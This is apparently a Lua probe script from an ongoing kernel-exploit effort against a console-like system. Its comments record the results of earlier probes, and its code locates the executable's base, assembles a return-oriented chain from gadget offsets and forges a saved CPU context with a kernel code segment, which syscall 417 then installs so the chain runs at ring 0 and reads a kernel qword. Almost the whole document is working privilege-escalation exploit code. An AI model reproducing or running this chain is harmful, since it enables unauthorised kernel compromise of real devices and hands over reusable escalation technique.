-- CRASH_CLASS: RISKY -- 417 with a kernel CS; process dies by design
-- PROBE 1367d: did any ring-0 code run at all?
--
-- 1366a, 1367b and 1367c all ended the same way: SIGBUS, mcontext mc_rip = the live
-- post-`syscall` return address, mc_cs = 0x43, mc_err = 2. 1367b set rax/rsi/rdi to a
-- self-referential page just before its own iretq and that dump still showed
-- mc_rax = 0x1A1 (417 itself) and mc_rdi = the frame buffer, i.e. the state captured
-- when 417 was entered. Two readings survive that:
--
--   (A) 417 installs the frame, the iretq lands at CPL0 and the chain runs -- the
--       dump is just a stale pre-417 context written because the fault happened in
--       kernel mode.
--   (B) 417 rejects a kernel CS, faults inside the kernel, and nothing ever executed
--       at CPL0.
--
-- This probe separates them with a known landmark instead of an inference. The chain
-- is unchanged, but its return frame points at 0x10000 -- the address 1359a proved
-- produces mc_rip = 0x10000 with mc_err = 0x14 (execute, not present, user) when 417
-- installs a frame. The frame's RSP slot keeps the LIVE value, because the loader has
-- no alternate signal stack: a bogus user RSP makes sendsig's copyout fail and no dump
-- is produced.
--
--   dump mc_rip = 0x10000, mc_err = 0x14 -> (A): the chain ran, ring-0 is reachable
--   dump mc_rip = live,    mc_err = 2    -> (B): nothing ran, CS=0x08 is rejected
--
-- Only after (A) is confirmed does a kernel qword exfil make sense; it then has to go
-- through the RIP slot alone, and only for a canonical user-range value.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1367c_ring0_two_qword_dump_20261109_120047.txt
--   results/phase35_dead_end_reruns/1367b_ring0_safe_return_20261109_115658.txt
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt
--   docs/dumps_13.60/kernel_text.bin (doreti tail at file 0x257b28..0x257b3d)

if _G.__p1367d_ran then
    print("=== PROBE 1367d RE-ENTRY ===")
    return
end
_G.__p1367d_ran = true

print("=== PROBE 1367d: CHAIN-REACH TEST + ONE KERNEL QWORD ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000
local QADDR    = KBASE_LO + 0x257B33

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X  qword target=0x%X%08X", EBN, KBASE_HI, QADDR))

local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local FP = SA + 0x100

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRSP = EBN + 0x9A2
local G_IRET   = EBN + 0x11F41

local i = 0
local function put(g, v) wrq(S + i, u64v(g)); if v then wrq(S + i + 8, v) end; i = i + 0x10 end
put(G_POPSI,  U(KBASE_HI, QADDR))
put(G_MOVRD,  nil)
put(G_POPRDI, u64v(SA + 0x1A0))     -- scratch only: not observable after death
put(G_MOVWR,  nil)
put(G_POPRSP, u64v(FP))
print(string.format("[1] chain=%d bytes at 0x%X  frame=0x%X", i, SA, FP))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
local ok421 = pcall(function() return sc421(uint64(F)) end)
if not ok421 then print("=== PROBE 1367d ABORT (421) ===") return end
local orig_rip    = rdq(F + 0xE0) or 0
local orig_cs     = rdq(F + 0xE8) or 0
local orig_rflags = rdq(F + 0xF0) or 0
local orig_rsp    = rdq(F + 0xF8) or 0
print(string.format("[1] live RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X",
    orig_rip, orig_cs, orig_rflags, orig_rsp))
if orig_cs ~= 0x43 then print("=== PROBE 1367d: unexpected CS, ABORT ===") return end

wrq(FP + 0x00, u64v(G_IRET))
wrq(FP + 0x08, u64v(0x10000))       -- landmark: 1359a showed mc_rip=0x10000, mc_err=0x14
wrq(FP + 0x10, u64v(0x43))
wrq(FP + 0x18, u64v(orig_rflags))
wrq(FP + 0x20, u64v(orig_rsp))      -- keep a valid user stack: no sigaltstack in the loader
wrq(FP + 0x28, u64v(0x3B))

wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print("[2] installing: iretq to eboot+0x9A2 at CPL0, chain reads one qword,")
print("    returns through eboot iretq to RIP=0x10000 (SIGSEGV if the chain ran)")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end
print("=== PROBE 1367d COMPLETE ===")
